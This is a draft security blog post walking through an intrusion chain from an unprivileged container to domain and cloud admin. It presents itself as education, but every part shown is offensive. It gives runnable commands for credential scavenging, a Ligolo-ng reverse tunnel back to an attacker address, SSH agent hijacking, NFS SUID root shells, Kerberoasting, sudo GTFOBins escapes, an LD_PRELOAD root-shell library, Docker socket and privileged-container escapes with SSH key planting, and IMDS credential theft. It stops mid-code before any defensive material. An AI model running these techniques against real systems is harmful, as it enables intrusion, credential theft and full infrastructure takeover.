---
title: "Climbing the Ladder: From Lateral movement to Privileged Access."
date: 2026-09-18T18:30:00+08:00
draft: true
math: true
description: "An offensive-to-defensive teardown of modern cyber intrusion chains. Analyzing how adversaries pivot through internal enterprise networks, harvest memory credentials, hijack SSH agent sockets, abuse Active Directory and Kerberos trusts, exploit container runtimes, and chain cloud IAM misconfigurations to ascend from an unprivileged beachhead to absolute administrative dominance."
tags: ["Security", "Linux", "Privilege Escalation", "Lateral Movement", "Zero Trust", "Active Directory", "Kerberos", "Kubernetes", "Cloud Security", "IAM", "eBPF", "DevOps", "SysAdmin"]
categories: ["Infrastructure & Security", "Linux", "Systems Architecture"]
cover:
  image: "/images/climbing-the-ladder-lateral-movement-privileged-access.jpg"
  alt: "Climbing the Ladder: From Lateral movement to Privileged Access."
  caption: "The Intrusion Chain: Foothold Establishment, Lateral Pivoting, Kerberos Abuse, Container Breakouts, and Cloud IAM Escalation"
  relative: false
---

In the spring of 2024, a sophisticated intrusion team breached the perimeter of a global logistics provider. 

The initial entry was neither cinematic nor glamorous: an unauthenticated Server-Side Request Forgery (SSRF) vulnerability inside an obscure, third-party PDF generation microservice. The service ran under the standard unprivileged Linux user `www-data` inside an unprivileged Docker container. It possessed no administrative permissions, no direct internet egress, and no mounted database volumes.

By any traditional perimeter-security assessment, the blast radius of this vulnerability was low. The compromised container was an ephemeral throwaway worker.

Yet, **forty-two minutes later**, the intrusion team possessed:
1. Full interactive `root` access across the underlying bare-metal Kubernetes worker nodes.
2. An active, forged Kerberos Ticket Granting Ticket (TGT) granting Domain Admin rights across the enterprise Windows Active Directory forest.
3. The `OrganizationAccountAccessRole` with unrestricted wildcard permissions (`"Action": "*"`, `"Resource": "*"`) over thirty-eight AWS production accounts.

How does an adversary start with an unprivileged, read-only container shell and end with total administrative supremacy over an entire corporate empire?

The answer lies in a fundamental cognitive failure of modern infrastructure engineering: **building castles with glass interiors**.

```
+---------------------------------------------------------------------------------------------------+
|                           THE "CASTLE WITH GLASS INTERIORS" PARADOX                                |
|                                                                                                   |
|   OUTER PERIMETER (Hardened Armor)            INTERNAL ENVIRONMENT (Fragile Glass)                 |
|   "Stop the World at the Boundary"            "Once Inside, Everything Trusts Everything"          |
|                                                                                                   |
|   - Next-Gen Web App Firewalls (WAF)          - Flat /16 subnets with zero internal firewalls     |
|   - Multi-Factor Authentication (MFA)         - SSH Agent Forwarding enabled on shared jumpboxes  |
|   - Strict Ingress DDoS Shields               - World-readable config files with plaintext secrets|
|   - Rate-limiting & Geo-blocking              - Broad sudo NOPASSWD wildcards on utility scripts   |
|   - Rigorous TLS termination                  - IMDSv1 enabled on EC2 instances allowing SSRF     |
|                                               - Over-permissioned IAM instance roles               |
|                                                                                                   |
|   Attacker Effort to Breach: EXTREME          Attacker Effort to Escalate: TRIVIAL                |
+---------------------------------------------------------------------------------------------------+
```

For two decades, cybersecurity doctrine prioritized the perimeter. Billions of dollars were poured into next-generation firewalls, ingress filters, and intrusion prevention systems. But the moment an attacker slips through that outer shell—whether via a compromised developer API token, a phishing hook, an unpatched zero-day in an open-source library, or an unauthenticated internal endpoint—they find an operating environment that relies on **ambient trust**.

An initial foothold is almost never `root` or Domain Admin. It is an unprivileged foothold: a low-privilege service account, a compromised continuous integration (CI) worker, a container pod, or an unprivileged developer workstation.

From this humble beachhead, the attacker begins **"Climbing the Ladder."**

This guide is an exhaustive, dual-perspective masterclass on how lateral movement and privilege escalation intersect to form catastrophic breach cascades. We will dissect the low-level mechanics of network pivoting, memory credential harvesting, SSH agent hijacking, Active Directory Kerberos exploitation, Linux container escapes, and cloud IAM permission chaining. Then, we will engineer the defensive architecture, kernel policies, and deception tripwires required to snap every single rung of that ladder.

---

## 1. The Anatomy of the Ladder: The Dual-Axis Intrusion Model

To defend a system, you must first understand the geometric coordinate space in which modern intrusions operate. An intrusion is not a linear sprint; it is an iterative traversal across two orthogonal axes: **The Horizontal Axis (Lateral Movement)** and **The Vertical Axis (Privilege Escalation)**.

```
+---------------------------------------------------------------------------------------------------+
|                                 THE DUAL-AXIS INTRUSION MATRIX                                     |
|                                                                                                   |
|   PRIVILEGE LEVEL (Vertical Ascent)                                                               |
|         ^                                                                                         |
|         |                                                           [ GOAL: Cloud Org Admin /     |
|  TIER 0 |                                                             Active Directory Domain Admin]
|  (Apex) |                                                                         ^               |
|         |                                                    (Vertical Step 4)    |               |
|         |                                                    IAM Chaining /       |               |
|         |                                                    Golden Ticket Forge  |               |
|         |                                                                         |               |
|  TIER 1 |                                           [ Production DB Host / Bastion Jumpbox ]      |
|  (Host  |                                                  ^                      |               |
|   Root) |                           (Vertical Step 3)      |                      |               |
|         |                           LPE / SUID / Kernel    |                      | (Lateral      |
|         |                                                  |                      |  Step 3)      |
|  TIER 2 |                 [ Worker Node (Host OS) ]--------+                      | SSH Agent     |
|  (Node/ |                        ^                                                | Hijack /      |
|  Subnet)|     (Vertical Step 2)  |                                                v Pivot         |
|         |     Container Breakout |                                      [ Staging App Server ]    |
|         |     (docker.sock /     |                                                |               |
|  TIER 3 |      cgroup escape)    |                                                | (Vertical     |
|  (App/  |                        |                                                |  Step 2b)     |
|  Pod)   |     [ Compromised Pod ]+------------- (Lateral Step 1) -----------------+ sudo GTFOBins |
|         |     (www-data / SSRF)                 Port Scan / Unauthenticated Redis                 |
|         |                                                                                         |
|  TIER 4 +------------------------------------------------------------------------------------->   |
|         INITIAL FOOTHOLD                                                ENTERPRISE ENVIRONMENT    |
|         (Single Microservice)                                           (Subnets, VPCs, Clouds)   |
|                                                                                                   |
|                                    NETWORK SCOPE (Horizontal Traversal)                           |
+---------------------------------------------------------------------------------------------------+
```

### The Mathematics of Lateral Expansion

We can formalize the risk of total enterprise compromise using a topological graph model. Let the enterprise infrastructure be represented as a directed graph $G = (V, E)$, where each vertex $v \in V$ represents an execution context (a container, a virtual machine, a database instance, a cloud IAM identity) and each directed edge $e = (u, v) \in E$ represents a traversal vector from node $u$ to node $v$.

An edge $e_{u \to v}$ exists if:
1. **Network Reachability**: Node $u$ can transmit IP packets to an open listening port on node $v$ ($R_{net}(u, v) = 1$).
2. **Ambient Credential Trust**: Node $u$ possesses or can harvest credentials, tokens, or cryptographic keys accepted by node $v$ ($C_{trust}(u, v) = 1$).
3. **Exploitable Vulnerability**: Node $v$ runs a service with an unpatched defect or misconfiguration exploitable by $u$ ($V_{exploit}(u, v) = 1$).

The **Total Attack Path Distance** $D_{path}$ between an unprivileged entry point $v_0$ and the Apex Target $v_{apex}$ (Domain Admin or Cloud Root) is given by:

$$D_{path}(v_0, v_{apex}) = \min_{\mathcal{P}} \sum_{i=1}^{k} \Big( \omega_{lat}(v_{i-1}, v_i) + \omega_{vert}(v_{i-1}, v_i) \Big)$$

Where:
* $\omega_{lat}$ is the cost (time, noise, tooling) of traversing horizontally between subnets.
* $\omega_{vert}$ is the cost of escalating privileges locally on a node.

In a traditional "flat" enterprise network with default-allow firewall rules, shared credentials, and unhardened Linux systems, $\omega_{lat} \to 0$ and $\omega_{vert} \to 0$. As a result, the distance $D_{path}$ collapses to near zero, enabling fully automated, scriptable lateral takeover.

---

## 2. Phase 1: The Beachhead — Living Off the Land (LotL) Reconnaissance

The moment an attacker achieves arbitrary code execution inside a target host, the clock starts ticking.

Amateur attackers immediately download noisy pre-compiled scanners (`nmap`, `fscan`, `linpeas.sh`) via `wget` or `curl`. On any modern enterprise host running an Endpoint Detection and Response (EDR) agent (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) or an eBPF-based audit daemon (`auditd`, `Tetragon`), executing an unsigned binary from `/tmp` or issuing an outbound HTTP request to an untrusted IP instantly triggers a high-severity alert.

Sophisticated operators do not drop foreign tools. They operate under the doctrine of **Living Off the Land (LotL)**: using only the pre-existing binaries, kernel interfaces, and virtual filesystems already present on the operating system.

### Low-Noise Host Fingerprinting via Virtual Filesystems

Linux exposes its entire kernel internal state through the `/proc` and `/sys` virtual filesystems. An attacker can map the host's identity, memory, architecture, and network connections without executing a single external binary.

```bash
# 1. Identify Kernel Version and Distribution Architecture without running uname
cat /proc/version
cat /etc/os-release

# 2. Extract active process trees and check for root-owned daemons
cat /proc/loadavg
for pid in $(ls -d /proc/[0-9]* | cut -d/ -f3); do
    if [ -f /proc/$pid/cmdline ]; then
        echo -n "PID $pid: "
        tr '\0' ' ' < /proc/$pid/cmdline
        echo ""
    fi
done 2>/dev/null | grep -E "docker|kubelet|postgres|vault|consul|sshd"

# 3. Discover local network sockets without netstat or ss
# Reading the raw kernel TCP socket table in hex format
cat /proc/net/tcp
```

The `/proc/net/tcp` file outputs the host's active network connections in raw hexadecimal format:

```text
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:1388 00000000:0000 0A 00000000:00000000 00:00000000 00000000   999        0 41235
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38912
```

An unprivileged user can parse this table with a single POSIX shell loop to decode ports and IP addresses without triggering security alerts:

```bash
# Decode /proc/net/tcp to human-readable IP:Port
while read -r line; do
    local_hex=$(echo "$line" | awk '{print $2}')
    if [ "$local_hex" != "local_address" ] && [ -n "$local_hex" ]; then
        ip_hex=$(echo "$local_hex" | cut -d: -f1)
        port_hex=$(echo "$local_hex" | cut -d: -f2)
        
        # Convert hex port to decimal
        port=$(printf "%d\n" "0x$port_hex")
        
        # Convert little-endian hex IP to dotted decimal
        ip1=$(printf "%d" "0x${ip_hex:6:2}")
        ip2=$(printf "%d" "0x${ip_hex:4:2}")
        ip3=$(printf "%d" "0x${ip_hex:2:2}")
        ip4=$(printf "%d" "0x${ip_hex:0:2}")
        
        echo "Listening on: $ip1.$ip2.$ip3.$ip4:$port"
    fi
done < /proc/net/tcp
```

* Output reveals:
  * `127.0.0.1:5000` (Internal administration or debugging API)
  * `0.0.0.0:22` (Standard SSH daemon)

### Scavenging Ambient Credentials

An unprivileged shell (`www-data`, `nobody`, or an unprivileged developer) cannot read `/etc/shadow`. But modern systems are littered with unprotected, ambient credentials that allow horizontal and vertical movement.

```bash
# 1. Inspect environment variables of current and accessible processes
env
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'

# 2. Search for cloud credentials and tokens in user homes
cat ~/.aws/credentials 2>/dev/null
cat ~/.azure/accessTokens.json 2>/dev/null
cat ~/.config/gcloud/credentials.db 2>/dev/null

# 3. Check for Kubernetes ServiceAccount tokens in pods
K8S_TOKEN="/var/run/secrets/kubernetes.io/serviceaccount/token"
K8S_NS="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
if [ -f "$K8S_TOKEN" ]; then
    echo "[!] Kubernetes Service Account Token Found!"
    echo "Namespace: $(cat $K8S_NS)"
    cat "$K8S_TOKEN"
fi

# 4. Scavenge SSH keys and configuration
cat ~/.ssh/config 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null
find /home /var/www /opt /tmp -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

---

## 3. Phase 2: Lateral Movement — Pivoting & Traversing Ambient Trust

Once an attacker understands the local node and extracts initial secrets, they must cross the boundary to adjacent systems. Modern enterprise clouds segment production into distinct subnets: public DMZs, private application clusters, and isolated database/storage enclaves.

To traverse these enclaves, the attacker transforms the compromised host into a **Pivot Router**.

```
+---------------------------------------------------------------------------------------------------+
|                                 THE REVERSE SOCKS5 PIVOT ARCHITECTURE                              |
|                                                                                                   |
|    ATTACKER WORKSTATION                 COMPROMISED DMZ HOST              INTERNAL DATABASE HOST  |
|    (External WAN: 198.51.100.5)         (Dual-Homed Pivot)                (Isolated: 10.10.50.25) |
|                                                                                                   |
|    +------------------------+           +-----------------------+         +---------------------+ |
|    | [Attacker Terminal]    |           | [Compromised Node]    |         | [Private DB Server] | |
|    |                        |           |                       |         |                     | |
|    | proxychains nmap...    |           | eth0: 192.168.1.50    |         | eth0: 10.10.50.25   | |
|    |        |               |           | eth1: 10.10.50.10     |         | Listening on:       | |
|    |        v               |           |                       |         |   :5432 (Postgres)  | |
|    | [Local SOCKS Port]     |  Reverse  |                       | Internal|                     | |
|    |   127.0.0.1:1080 <====== Encrypted ====> Reverse Agent     +== LAN ==> Requests Forwarded  | |
|    +------------------------+  Tunnel   |   (Ligolo / Chisel)   | Request |   to Target         | |
|                                         +-----------------------+         +---------------------+ |
+---------------------------------------------------------------------------------------------------+
```

### 1. Reverse Dynamic Tunneling: From Chisel to Ligolo-ng

Historically, attackers used SSH dynamic port forwarding (`ssh -D 1080 user@host`). However, compromised production servers rarely permit inbound SSH from the internet, and compromised container images rarely contain an SSH client.

Modern operators use **Reverse Dynamic Multiplexing**:
* **Chisel**: An HTTP/WebSocket-encapsulated TCP/UDP tunnel that passes effortlessly through enterprise egress proxies, deep packet inspection (DPI), and stateful egress firewalls.
* **Ligolo-ng**: The gold standard in modern pivoting. Rather than relying on slow, application-layer SOCKS proxies (which require wrapping every tool in `proxychains` and fail on raw ICMP/SYN packets), Ligolo-ng establishes a **virtual TUN interface** directly on the attacker’s machine. The attacker can directly address the remote internal subnet (`10.10.50.0/24`) as if it were locally attached to their network adapter.

```bash
# --- On Attacker Control Server ---
# 1. Setup ligolo proxy listener
./ligolo-proxy -selfcert -laddr 0.0.0.0:443

# 2. Configure a virtual TUN adapter on the attacker OS
sudo ip tuntap add user attacker mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.50.0/24 dev ligolo

# --- On Compromised Target (Pivot Node) ---
# Connect back over outbound HTTPS (Port 443)
./ligolo-agent -connect 198.51.100.5:443 -ignore-cert
```

Once the tunnel connects, the attacker has seamless Layer 3 access to the private database subnet. They can run native ping sweeps, full-range port scans, and exploit private services without installing any additional software on the pivot host.

---

### 2. Linux Lateral Vectors: The SSH Agent Socket Hijack

When system administrators manage a fleet of Linux servers, they rarely keep private SSH keys on every intermediate node. Instead, they use a bastion jumpbox and enable **SSH Agent Forwarding** (`ssh -A`).

This is one of the most widely misunderstood security hazards in infrastructure engineering.

#### The Vulnerability Mechanism

When an administrator connects to a remote server with `ssh -A admin@bastion.corp`:
1. The remote `sshd` daemon creates a Unix domain socket inside the bastion's `/tmp` directory, typically matching the pattern `/tmp/ssh-XXXXXX/agent.<PID>`.
2. The remote session exports the environment variable `SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.<PID>`.
3. Whenever the administrator invokes `ssh internal-db.corp` from the bastion, the remote SSH client does not need a private key. It communicates across the local Unix domain socket back to the administrator's local laptop, which signs the authentication challenge in memory and returns the signature.

If an attacker achieves `root` access on the bastion (or compromises any user account that can read that specific `/tmp` socket), **they do not need to steal the administrator's private SSH key**. They can simply hijack the active socket.

```bash
# Locate all active SSH agent sockets across the system
find /tmp -type s -name "agent.*" 2>/dev/null
```

Example discovery:
```text
/tmp/ssh-u8yHqL9z12/agent.18492
/tmp/ssh-kL4mOp2Q88/agent.19034
```

To hijack the session and pivot to any internal server that the administrator has access to:

```bash
# 1. Hijack the target agent socket
export SSH_AUTH_SOCK=/tmp/ssh-u8yHqL9z12/agent.18492

# 2. List the identities loaded into the hijacked agent
ssh-add -l

# Output:
# 4096 SHA256:7vQx... devops-lead@company.internal (RSA)
# 256  SHA256:pM9b... infra-master-key (ED25519)

# 3. Authenticate to internal core infrastructure as the admin
ssh -o StrictHostKeyChecking=no root@10.10.50.25
```

The authentication succeeds instantly. No password prompt, no private key exfiltration, and zero forensic trace of key material on the compromised machine.

---

### 3. NFS `no_root_squash` Pivoting

Network File System (NFS) shares are ubiquitously used to share directories, application assets, and backups across Linux server clusters.

By default, NFS implements **Root Squashing**: when a client connecting as local `uid=0` (root) attempts to access files on the NFS share, the server maps their UID to `nobody` (or `nfsnobody`), preventing a compromised client from altering administrative files.

However, system administrators frequently disable this safeguard by adding the `no_root_squash` option to `/etc/exports` to allow automated deployment scripts to write files without permission errors.

```text
# Vulnerable /etc/exports on 10.10.50.30
/data/shared   10.10.0.0/16(rw,sync,no_root_squash,no_subtree_check)
```

#### The Lateral Escalation Attack

If an attacker gains local root on *any single host* within the `10.10.0.0/16` subnet, they can escalate to root on the central NFS storage server and any other server mounting that share:

```bash
# On the compromised client where attacker is root:
# 1. Mount the remote vulnerable NFS share
mkdir -p /mnt/nfs_pivot
mount -t nfs 10.10.50.30:/data/shared /mnt/nfs_pivot

# 2. Copy a standard POSIX shell into the mounted share
cp /bin/bash /mnt/nfs_pivot/rootbash

# 3. Set the SUID bit on the binary
# Because no_root_squash is active, the NFS server allows the client's root UID
# to set SUID bits on files stored on the server's disk!
chmod +s /mnt/nfs_pivot/rootbash
chmod 777 /mnt/nfs_pivot/rootbash
```

Now, the attacker logs into the NFS server (or any other machine mounting `/data/shared`) as an unprivileged user:

```bash
# On the target server as unprivileged user:
/data/shared/rootbash -p

# Result:
# Effective UID is now 0 (root)!
whoami
# root
```

---

### 4. Active Directory & Kerberos Pivoting: The Enterprise Spine

In hybrid cloud and enterprise environments, Windows Active Directory (AD) remains the centralized identity backbone. Linux servers frequently join AD realms via SSSD (`sssd`), Winbind, or Kerberos (`krb5`) for centralized SSH authentication.

When an attacker breaches an AD-joined Linux or Windows host, they pivot from operating system concepts to **Identity Graph Traversal**.

```
+---------------------------------------------------------------------------------------------------+
|                                  THE KERBEROASTING ATTACK CYCLE                                   |
|                                                                                                   |
|    ATTACKER                DOMAIN CONTROLLER (KDC)                 OFFLINE CRACKING RIG           |
|                                                                                                   |
|    1. Query SPNs for                                                                              |
|       Service Accounts ===> Identifies:                                                           |
|                             MSSQLSvc/db01.corp:1433                                               |
|                                                                                                   |
|    2. Request TGS Ticket                                                                          |
|       for Target SPN =====> Issues valid TGS Ticket                                               |
|       (Kerberos KRB_TGS_REQ)Encrypted with Service                                                |
|                             Account's NTLM Password Hash                                          |
|                                                                                                   |
|    3. Extract Ticket from                                                                         |
|       Local Memory/Cache == (Exported as Hashcat format 13100)                                    |
|                                                                    4. Brute-Force Hash            |
|                                                               ====> hashcat -m 13100              |
|                                                                       tickets.txt rockyou.txt     |
|                                                                                                   |
|                                                                    Cracked Password:              |
|                                                                    "Summer2024!DbAdmin"           |
+---------------------------------------------------------------------------------------------------+
```

#### Kerberoasting Mechanics

Kerberoasting is an attack that allows any authenticated domain user (even the lowest-privileged service account) to steal password hashes for service accounts without sending a single packet to the target server hosting the service.

1. **Service Principal Names (SPNs)**: In Active Directory, any service running under a user account must register an SPN (e.g., `MSSQLSvc/sqlprod.corp:1433`).
2. **Ticket Granting Service (TGS) Request**: An authenticated domain client asks the Domain Controller (KDC) for a TGS ticket to communicate with that SPN.
3. **The Flaw**: The KDC encrypts the returned TGS ticket using the **password hash of the service account** that owns the SPN. The KDC does not verify whether the requesting user is actually authorized to access the service.
4. **Offline Cracking**: The attacker extracts the ticket from memory and cracks it offline using dictionary attacks. The Domain Controller never sees the cracking attempts.

```bash
# Linux-native Kerberoasting via Impacket (from unprivileged beachhead with AD credentials)
GetUserSPNs.py corp.internal/lowpriv_user:Password123 -dc-ip 10.10.10.1 -request -outputfile kerberoast_hashes.txt

# Crack offline using Hashcat
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

If the service account possesses elevated domain privileges (such as local admin on multiple database servers or membership in privileged AD groups), the attacker immediately uses those credentials to pivot horizontally across the entire Windows estate.

---

## 4. Phase 3: Vertical Privilege Escalation — Host, Kernel, and Container Breakouts

Lateral movement brings an attacker to new physical or virtual hosts. But to install persistence, disable logging, dump memory, or access raw storage devices, the attacker must achieve **Vertical Privilege Escalation (LPE)** to `root` or `SYSTEM`.

### 1. Sudo Misconfigurations & GTFOBins

The `sudo` utility is the single most common privilege delegation tool in UNIX history. It is also the most frequently misconfigured.

Administrators frequently create `/etc/sudoers` rules intended to give junior engineers or automated backup scripts the ability to run specific maintenance commands without a password.

```text
# Dangerous /etc/sudoers excerpt
appuser ALL=(ALL) NOPASSWD: /usr/bin/find, /usr/bin/vim, /usr/bin/rsync, /usr/bin/systemctl
```

To a security engineer who has not studied binary mechanics, granting `find` or `rsync` seems relatively harmless compared to granting `/bin/bash`. In reality, **dozens of standard UNIX utilities can execute arbitrary shell commands directly from their parameter sets**.

The definitive catalog of these escape vectors is maintained by the open-source **GTFOBins** project.

#### Sudo GTFOBins Exploitation Table

| Binary | Legitimate Purpose | Sudo Privilege Escalation Command |
| :--- | :--- | :--- |
| **`find`** | File searching | `sudo find . -exec /bin/sh \; -quit` |
| **`vim` / `vi`** | Text editing | `sudo vim -c ':!/bin/sh'` |
| **`less` / `more`** | Paging text files | `sudo less /etc/hosts` then type `!/bin/sh` |
| **`awk`** | Stream parsing | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **`rsync`** | File synchronization | `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` |
| **`tar`** | Archive creation | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| **`env`** | Environment display | `sudo env /bin/sh` |

```bash
# Instant Root via Sudo Find
appuser@prod-server:~$ sudo -l
Matching Defaults entries for appuser on prod-server:
    env_reset, mail_badpass

User appuser may run the following commands on prod-server:
    (ALL) NOPASSWD: /usr/bin/find

appuser@prod-server:~$ sudo find / -name "test" -exec /bin/bash \;
root@prod-server:/home/appuser# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Sudo Environment Inheritance: `LD_PRELOAD`

Another catastrophic misconfiguration occurs when `sudoers` preserves the user's environment variables:

```text
Defaults env_keep += "LD_PRELOAD"
```

The dynamic linker (`ld.so`) uses the `LD_PRELOAD` environment variable to load shared libraries before any other library. If `env_keep` preserves this variable, an unprivileged user can compile a tiny C library that hooks `_init()` and launches a root shell:

```c
// root_preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so root_preload.c

# Execute ANY command allowed by sudo with the malicious preloaded library
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/uptime

# Result:
# The dynamic linker loads /tmp/preload.so into the privileged sudo process
# and executes _init() with uid=0 before uptime even starts!
root@prod-server:~# whoami
root
```

---

### 2. SUID/SGID Binaries & Linux Capabilities

When a binary has the **Setuid (SUID)** bit set (`chmod u+s`), the Linux kernel executes that binary with the file owner's privileges (typically `root`), regardless of which user invoked it.

While core utilities like `/usr/bin/passwd` and `/usr/bin/sudo` require SUID to function, developers often set SUID bits on custom maintenance scripts, debugging binaries, or python interpreters.

```bash
# Audit the entire filesystem for SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

#### The Linux Capabilities Vector

To mitigate the broad risks of SUID, modern Linux kernels introduced **POSIX Capabilities** (`man 7 capabilities`). Capabilities divide monolithic root authority into distinct, fine-grained privileges:
* `CAP_CHOWN`: Make arbitrary changes to file UIDs/GIDs.
* `CAP_DAC_OVERRIDE`: Bypass all file read, write, and execute permission checks.
* `CAP_SETUID`: Arbitrarily set the process UID.
* `CAP_SYS_ADMIN`: A monolithic capability that grants nearly full root equivalence (mounting filesystems, loading drivers, configuring cgroups).

If a sysadmin attempts to give a utility specific powers using `setcap`, they often introduce lethal escalation paths:

```bash
# List all files with elevated capabilities
getcap -r / 2>/dev/null

# Vulnerable finding:
# /usr/bin/python3.11 = cap_setuid+ep
```

Any binary that possesses `cap_setuid+ep` allows an attacker to set their UID to 0:

```bash
# Unprivileged user escalates to root via Python with cap_setuid
python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Result:
root@prod-server:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### 3. Container Breakouts: Shattering the Linux Namespace Illusion

Containers are not virtual machines. There is no hypervisor, no separate operating system kernel, and no true hardware isolation. A container is simply a standard Linux process isolated by **Namespaces** (PID, Mount, Network, IPC, UTS, User) and constrained by **Control Groups (cgroups)**.

When containers are deployed with insecure flags or architectural antipatterns, the boundary shatters.

```
+---------------------------------------------------------------------------------------------------+
|                                  THE DOCKER.SOCK ESCAPE ARCHITECTURE                               |
|                                                                                                   |
|    CONTAINER BOUNDARY (Isolated Namespace)             HOST OPERATING SYSTEM                      |
|                                                                                                   |
|    +--------------------------------------+           +-----------------------------------------+ |
|    | Vulnerable Web Application Container |           | Bare-Metal Worker / Virtual Machine     | |
|    |                                      |           |                                         | |
|    | Mounted Socket:                      |           | Docker Daemon Service                   | |
|    | /var/run/docker.sock <============================> /var/run/docker.sock (UNIX Socket)    | |
|    |                                      |           |                                         | |
|    | Attacker issues Docker API command:  |           | Host Root Filesystem                    | |
|    | "POST /containers/create"            |           | /etc, /root, /bin, /var                 | |
|    | Volume Mount: /host => /             |           |   ^                                     | |
|    +--------------------------------------+           |   | Mounted with rw                     | |
|                                                       |   v                                     | |
|                                                       | [New Privileged Container]              | |
|                                                       |   chroot /host /bin/bash                | |
|                                                       |   ===> COMPLETE HOST TAKEOVER           | |
|                                                       +-----------------------------------------+ |
+---------------------------------------------------------------------------------------------------+
```

#### Vector A: The Mounted Docker Socket (`/var/run/docker.sock`)

Many CI/CD runners and container management tools mount the host's `/var/run/docker.sock` directly inside a container to allow "Docker-in-Docker" image building.

The Docker UNIX domain socket is the raw management API of the Docker daemon. **Any process that can communicate with `/var/run/docker.sock` has full root control over the host.**

```bash
# Test if docker socket is accessible inside container
curl --unix-socket /var/run/docker.sock http://localhost/version
```

If accessible, the attacker does not need an exploit. They use standard API calls to spawn a sibling container that mounts the host’s entire root filesystem into `/mnt/host`:

```bash
# 1. Create a container mounting the host root filesystem
curl -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  http://localhost/containers/create?name=host_root \
  -d '{"Image": "alpine", "Cmd": ["chroot", "/host", "/bin/sh"], "Tty": true, "OpenStdin": true, "Binds": ["/:/host"]}'

# 2. Start the container
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/host_root/start

# 3. Attach and execute commands as Host Root
# The attacker has completely escaped the container boundary!
```

#### Vector B: The `--privileged` Flag and Host Devices

When a container runs with `docker run --privileged` or `securityContext.privileged: true` in Kubernetes:
1. The container receives all Linux capabilities.
2. The device cgroup is dropped, exposing all host device nodes (`/dev`) inside the container.

An attacker inside a privileged container simply identifies the host's primary storage disk and mounts it directly:

```bash
# Inside a privileged container:
# 1. Identify the host hard drive partition
fdisk -l
# Displays host disk: /dev/sda1 or /dev/nvme0n1p1

# 2. Mount host root drive to local container mountpoint
mkdir -p /mnt/host_root
mount /dev/sda1 /mnt/host_root

# 3. Access host secrets or write a new root SSH key
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@c2" >> /mnt/host_root/root/.ssh/authorized_keys

# 4. Or simply chroot directly into the host OS
chroot /mnt/host_root /bin/bash
```

The container escape is complete. The attacker is now running on the bare-metal host operating system.

---

## 5. Phase 4: Cloud & Identity Privilege Escalation — From Pod/VM to Cloud Admin

Once an attacker compromises a host or container running inside a cloud provider (AWS, GCP, Azure), they rarely stay at the operating system layer. They set their sights on the cloud control plane: **Identity and Access Management (IAM)**.

### 1. The Instance Metadata Service (IMDS) Gateway

Cloud virtual machines (EC2 instances, GCE compute engines) receive runtime credentials through an internal link-local IP address: `169.254.169.254`.

```bash
# AWS IMDSv1 Query (Vulnerable to simple SSRF)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns attached role name: "EKS-Worker-Node-Role"

# Extract AWS Temporary Security Credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EKS-Worker-Node-Role
```

Response:
```json
{
  "Code": "Success",
  "LastUpdated": "2026-09-18T10:14:02Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...EXAMPLEKEY",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-09-18T16:20:00Z"
}
```

The attacker exports these credentials to their local terminal. They are no longer a compromised web application; **they are an authenticated AWS IAM entity**.

---

### 2. AWS IAM Escalation Chaining: The 21 Paths to AdministratorAccess

Once inside AWS with an IAM identity, the attacker analyzes their effective permissions using tools like `enumerate-iam` or `Pacu`.

Cloud security teams often believe that if they do not explicitly grant `AdministratorAccess`, the identity is safe. This is false. A wide variety of seemingly mundane IAM permissions can be **chained together** to achieve immediate escalation to full administrator dominance.

```
+---------------------------------------------------------------------------------------------------+
|                                  AWS IAM PERMISSION ESCALATION CHAIN                               |
|                                                                                                   |
|    LOW-PRIVILEGE ROLE                       ESCALATION VECTOR               ADMINISTRATOR ACCESS  |
|                                                                                                   |
|    +-------------------------+             +----------------------+         +-------------------+ |
|    | Current Identity:       |             | Action:              |         | Assumed Identity: | |
|    | "Dev-CI-Worker"         |             | iam:PassRole         |         | "Admin-Execution" | |
|    |                         |             | lambda:CreateFunction|         |                   | |
|    | Permissions:            |  Chained    | lambda:InvokeFunction| Escalates| Permissions:      | |
|    | - iam:PassRole          +============>|                      +========>| - "*:*"           | |
|    | - lambda:CreateFunction |             | Create Lambda script |         | (Full Wildcard    | |
|    | - lambda:InvokeFunction |             | that runs under an   |         |  Cloud Root)      | |
|    +-------------------------+             | existing Admin Role  |         +-------------------+ |
|                                            +----------------------+                               |
+---------------------------------------------------------------------------------------------------+
```

#### The Top 5 Lethal IAM Escalation Vectors

#### 1. `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`
* **Vulnerability**: The attacker has permission to create AWS Lambda functions and pass an existing IAM role to the function.
* **Exploitation**: The attacker creates a Lambda function, passes an existing privileged role (e.g., `BillingAdmin` or `FullAccessAdmin`), and writes code in Python that attaches `AdministratorAccess` to their own IAM user.

```python
# Malicious Lambda Payload
import boto3
